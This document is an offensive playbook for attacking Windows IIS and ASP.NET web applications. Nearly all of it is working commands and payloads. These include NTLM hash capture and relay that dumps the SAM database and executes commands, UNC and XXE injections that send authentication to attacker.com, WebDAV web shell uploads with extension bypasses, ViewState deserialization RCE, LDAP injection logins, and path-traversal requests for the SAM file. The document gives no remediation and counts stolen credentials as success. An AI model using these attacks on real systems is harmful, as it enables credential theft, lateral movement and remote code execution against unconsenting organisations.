# Windows Web Playbook

## Indicators

Signs this vulnerability may be present:
- Server header indicating IIS (Internet Information Services)
- ASP.NET stack markers: `.aspx`, `.ashx`, `.asmx`, `.svc` file extensions
- `X-AspNet-Version` or `X-Powered-By: ASP.NET` response headers
- Windows file paths in error messages (e.g., `C:\inetpub\wwwroot\`)
- WebDAV methods enabled (OPTIONS reveals PROPFIND, COPY, MOVE)
- NTLM authentication prompts or `WWW-Authenticate: NTLM` headers
- Active Directory integration indicators
- File upload functionality that may accept UNC paths
- Image/file inclusion features that could be exploited for NTLM relay

## Tools

### Responder

```bash
# Start Responder to capture NTLM hashes
sudo responder -I eth0 -v

# With WPAD proxy attack
sudo responder -I eth0 -wv

# Capture mode only (no poisoning)
sudo responder -I eth0 -A

# With specific protocols
sudo responder -I eth0 -r -d -w

# Log file location
cat /usr/share/responder/logs/Responder-Session.log

# Parse captured hashes
cat /usr/share/responder/logs/HTTP-NTLMv2-*.txt
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
```

### ntlmrelayx (Impacket)

```bash
# Basic relay to target
impacket-ntlmrelayx -t smb://192.168.1.10

# Relay to multiple targets
impacket-ntlmrelayx -tf targets.txt

# Execute command on successful relay
impacket-ntlmrelayx -t smb://192.168.1.10 -c "whoami"

# Relay to LDAP for AD attacks
impacket-ntlmrelayx -t ldap://dc01.domain.local --escalate-user attacker

# Relay with SMB signing disabled
impacket-ntlmrelayx -t smb://192.168.1.10 -smb2support

# Dump SAM database
impacket-ntlmrelayx -t smb://192.168.1.10 --sam

# Interactive SMB shell
impacket-ntlmrelayx -t smb://192.168.1.10 -i

# Relay to HTTP endpoint
impacket-ntlmrelayx -t http://192.168.1.10/ews/
```

### Hashcat for NTLM Cracking

```bash
# Crack NTLMv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NTLMv1 hashes
hashcat -m 5500 ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM (from SAM dump)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 5600 ntlmv2_hashes.txt --show
```

### IIS Short Name Scanner

```bash
# Install
git clone https://github.com/irsdl/IIS-ShortName-Scanner
cd IIS-ShortName-Scanner

# Basic scan
java -jar iis_shortname_scanner.jar http://target.com/

# With custom config
java -jar iis_shortname_scanner.jar http://target.com/ 2 20

# Alternative Python tool
pip install shortscan
shortscan http://target.com/
```

### davtest

```bash
# Test WebDAV for file upload
davtest -url http://target.com/webdav/

# With authentication
davtest -url http://target.com/webdav/ -auth user:password

# Custom directory
davtest -url http://target.com/webdav/ -directory test123
```

### cadaver (WebDAV client)

```bash
# Connect to WebDAV
cadaver http://target.com/webdav/

# Commands inside cadaver:
# put shell.aspx
# get config.xml
# delete file.txt
# mkcol newdir
# move file.txt newdir/
# copy file.txt backup.txt
```

## Techniques

### 1. NTLM Hash Capture via Web Application

Trigger NTLM authentication through various web attack vectors.

```html
<!-- UNC path in image tag -->
<img src="\\attacker.com\share\image.png">
<img src="file://attacker.com/share/image.png">

<!-- In CSS -->
<style>
body {
    background: url('\\\\attacker.com\\share\\bg.png');
}
</style>

<!-- In JavaScript -->
<script>
var img = new Image();
img.src = '\\\\attacker.com\\share\\track.gif';
</script>

<!-- In iframe -->
<iframe src="\\attacker.com\share\page.html"></iframe>

<!-- In object tag -->
<object data="\\attacker.com\share\data.xml"></object>

<!-- In embed tag -->
<embed src="\\attacker.com\share\content"></embed>

<!-- In link preload -->
<link rel="preload" href="\\attacker.com\share\style.css">
```

```bash
# Start Responder to capture hashes
sudo responder -I eth0 -v

# Inject UNC path via URL parameter
curl "http://target.com/download?file=\\\\attacker.com\\share\\file.txt"

# Via user-controlled content (profiles, comments, etc.)
curl -X POST http://target.com/update_profile \
  -d 'avatar_url=\\attacker.com\share\img.png'

# In XML/XXE context
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "\\\\attacker.com\\share\\xxe">
]>
<data>&xxe;</data>'
```

### 2. WebDAV Exploitation

```bash
# Check for WebDAV
curl -X OPTIONS http://target.com/ -v
# Look for: Allow: OPTIONS, PROPFIND, COPY, MOVE, DELETE, PUT, MKCOL

# PROPFIND to list directory
curl -X PROPFIND http://target.com/webdav/ \
  -H "Depth: 1" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<propfind xmlns="DAV:">
  <allprop/>
</propfind>'

# Upload file via PUT
curl -X PUT http://target.com/webdav/shell.aspx \
  --data-binary @shell.aspx

# Upload with authentication
curl -X PUT http://target.com/webdav/shell.aspx \
  --data-binary @shell.aspx \
  -u "domain\\user:password" --ntlm

# Create directory
curl -X MKCOL http://target.com/webdav/newdir/

# Move file (bypass extension restrictions)
curl -X MOVE http://target.com/webdav/shell.txt \
  -H "Destination: http://target.com/webdav/shell.aspx"

# Copy file
curl -X COPY http://target.com/webdav/config.xml \
  -H "Destination: http://target.com/webdav/backup.xml"
```

### 3. IIS Tilde Enumeration (Short Name)

```bash
# Manual testing
# Valid short name returns 404, invalid returns 400
curl -I "http://target.com/W~1*~1.*/.aspx"  # 404 = exists
curl -I "http://target.com/X~1*~1.*/.aspx"  # 400 = doesn't exist

# Enumerate first character
for c in {A..Z}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/${c}~1*~1.*/.aspx")
  if [ "$response" == "404" ]; then
    echo "Found: ${c}"
  fi
done

# Full enumeration script
#!/bin/bash
URL="http://target.com"
CHARS="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

enumerate() {
    prefix=$1
    for (( i=0; i<${#CHARS}; i++ )); do
        char="${CHARS:$i:1}"
        test_name="${prefix}${char}"

        # Test if character is part of name
        code=$(curl -s -o /dev/null -w "%{http_code}" "${URL}/${test_name}*~1.*/.aspx")

        if [ "$code" == "404" ]; then
            echo "Found prefix: ${test_name}"
            if [ ${#test_name} -lt 6 ]; then
                enumerate "$test_name"
            fi
        fi
    done
}

enumerate ""
```

### 4. ASP.NET ViewState Attacks

```bash
# Check for ViewState
curl -s http://target.com/page.aspx | grep -i viewstate

# Decode ViewState (base64)
echo "BASE64_VIEWSTATE_HERE" | base64 -d

# Check if ViewState MAC is disabled (vulnerable)
# Use ysoserial.net to generate payload
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc.exe" -o base64

# For ViewState with MAC validation disabled
curl -X POST http://target.com/page.aspx \
  -d "__VIEWSTATE=/wEy..." \
  -d "other_params=value"

# Check for ViewStateUserKey (CSRF protection)
# Missing ViewStateUserKey allows ViewState CSRF
```

### 5. LDAP Injection (AD Integrated)

```bash
# Test for LDAP injection in search/login
# Basic injection
curl "http://target.com/search?user=*"
curl "http://target.com/search?user=admin)(|(password=*)"

# Enumerate users
curl "http://target.com/search?user=*)(uid=*"
curl "http://target.com/search?user=admin*"

# Extract attributes
curl "http://target.com/search?user=admin)(userPassword=*"

# Bypass authentication
curl "http://target.com/login" \
  -d "username=admin)(&" \
  -d "password=anything"

# OR condition injection
curl "http://target.com/login" \
  -d "username=*)(|(cn=*" \
  -d "password=anything"

# Common LDAP injection payloads
*
*)(&
*))%00
admin)(&)
admin)(|(password=*)
)(cn=*)(|(cn=*
*)(uid=*))(|(uid=*
```

### 6. IIS-Specific Vulnerabilities

```bash
# Test for path traversal with IIS-specific encoding
curl "http://target.com/..%c0%af..%c0%afwindows/system32/config/sam"
curl "http://target.com/..%c1%1c..%c1%1cwindows/system32/config/sam"
curl "http://target.com/..%c1%9c..%c1%9cwindows/system32/config/sam"
curl "http://target.com/..%255c..%255cwindows/system32/config/sam"

# Double encoding
curl "http://target.com/..%252f..%252fetc/passwd"

# Semicolon path parsing (IIS before 7.5)
curl "http://target.com/admin.asp;.jpg"
curl "http://target.com/shell.asp;.txt"

# Test for handler mappings
curl "http://target.com/test.asp::$DATA"
curl "http://target.com/web.config::$DATA"

# Enumerate backup files
curl "http://target.com/web.config.bak"
curl "http://target.com/web.config.old"
curl "http://target.com/web.config~"

# Test .NET trace
curl "http://target.com/trace.axd"

# Test elmah error logs
curl "http://target.com/elmah.axd"

# Test .NET webresource
curl "http://target.com/webresource.axd?d=..."
```

### 7. NTLM Relay Attack Chain

```bash
# Step 1: Set up ntlmrelayx targeting internal hosts
impacket-ntlmrelayx -t smb://192.168.1.10 -smb2support

# Step 2: Trigger NTLM auth from web app
# Inject UNC path that causes victim to authenticate

# Example: SSRF to file:// or UNC
curl "http://target.com/proxy?url=file://attacker.com/share/file"

# Example: XXE with UNC path
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "\\\\attacker.com\\share\\xxe">
]>
<foo>&xxe;</foo>'

# Step 3: Relayed authentication executes commands on target

# For LDAP relay (requires LDAP signing not enforced)
impacket-ntlmrelayx -t ldap://dc01.domain.local --escalate-user attacker
```

### 8. Forced Authentication via PDF/Office

```bash
# Create malicious PDF with UNC path
# Use tools like BadPDF or custom crafting

# PDF with UNC path in /AA (Additional Action)
# When opened, triggers SMB connection

# Office documents with remote template
# Word document with template from UNC path triggers auth

# Create using responder-generated templates
cd /usr/share/responder/files
ls -la  # Contains templates for various formats

# Upload malicious document to web app
curl -X POST http://target.com/upload \
  -F "file=@malicious.docx"
```

## Bypass Techniques

### UNC Path Filter Bypass

```
# Standard UNC
\\attacker.com\share\file

# Forward slashes
//attacker.com/share/file

# Mixed slashes
\/attacker.com/share/file
/\attacker.com\share\file

# URL encoded
%5c%5cattacker.com%5cshare%5cfile
%2f%2fattacker.com%2fshare%2ffile

# Double URL encoded
%255c%255cattacker.com%255cshare%255cfile

# Unicode encoded
\\\\attacker.com\\share\\file
%c0%5c%c0%5cattacker.com%c0%5cshare%c0%5cfile

# @ symbol (credential format)
\\attacker.com@80\share\file

# With credentials
\\user:pass@attacker.com\share\file

# WebDAV format (HTTP)
\\attacker.com@80\DavWWWRoot\share\file
\\attacker.com@SSL\DavWWWRoot\share\file
\\attacker.com@SSL@443\DavWWWRoot\share\file

# file:// protocol variations
file://attacker.com/share/file
file:////attacker.com/share/file
file://///attacker.com/share/file
```

### Extension Bypass for Upload

```bash
# Semicolon trick (old IIS)
shell.asp;.jpg
shell.aspx;.png

# Null byte (old systems)
shell.asp%00.jpg

# Double extension
shell.asp.jpg.asp
shell.jpg.asp

# Case manipulation
shell.AsP
shell.AsPx

# Alternative extensions
shell.asa
shell.cer
shell.cdx
shell.ashx

# Handler abuse
shell.config
shell.soap

# With trailing dot
shell.asp.
shell.aspx.

# With trailing space
shell.asp[space]
shell.asp::$DATA

# WebDAV MOVE trick
# Upload as .txt, then MOVE to .asp
curl -X PUT http://target.com/webdav/shell.txt --data-binary @shell.asp
curl -X MOVE http://target.com/webdav/shell.txt \
  -H "Destination: http://target.com/webdav/shell.asp"
```

### ViewState MAC Bypass

```bash
# If machineKey is leaked in web.config
# Generate payload with known key
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter \
  --key="MACHINE_KEY_HERE" \
  -c "powershell -enc BASE64_PAYLOAD"

# Common locations for web.config
http://target.com/web.config
http://target.com/Web.config
http://target.com/WEB.CONFIG

# LFI to read web.config
http://target.com/download?file=../web.config
http://target.com/download?file=....//....//web.config

# XXE to read web.config
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
]>
<foo>&xxe;</foo>
```

### NTLM Authentication Downgrade

```bash
# Force NTLMv1 (weaker, easier to crack)
# Responder with --lm flag
sudo responder -I eth0 --lm

# Or configure in Responder.conf
# Set "Challenge" to 1122334455667788

# NTLMv1 hashes are easier to crack
hashcat -m 5500 ntlmv1.txt wordlist.txt

# Can also pass to crack.sh for rainbow tables
```

## Success Indicators

- NTLM hash captured in Responder logs
- Successful hash crack reveals cleartext password
- WebDAV file upload successful (shell accessible)
- NTLM relay executes commands on target system
- IIS short filename enumeration reveals hidden files
- ViewState deserialization leads to RCE
- LDAP injection returns unauthorized data
- Path traversal reads sensitive Windows files (SAM, web.config)
- Forced authentication from internal users captured
- Service account credentials captured via web application
- Domain user enumeration through LDAP injection
- Backup files or config files disclosed
- Trace.axd or elmah.axd reveals debugging information
- SAM database dumped via NTLM relay
